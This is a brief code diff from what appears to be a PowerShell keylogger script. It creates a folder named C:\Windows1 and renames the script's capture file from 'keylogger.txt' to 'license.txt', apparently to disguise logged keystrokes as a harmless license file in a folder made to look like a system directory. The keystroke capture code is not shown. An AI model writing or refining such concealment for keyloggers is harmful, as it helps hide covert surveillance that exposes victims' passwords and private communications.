@@ -3,7 +3,7 @@
 
 mkdir C:\Windows1\
 
-$path = "C:\Windows1\keylogger.txt"
+$path = "C:\Windows1\license.txt"
 
 
 if ((Test-Path $path) -eq $false) {New-Item $path}
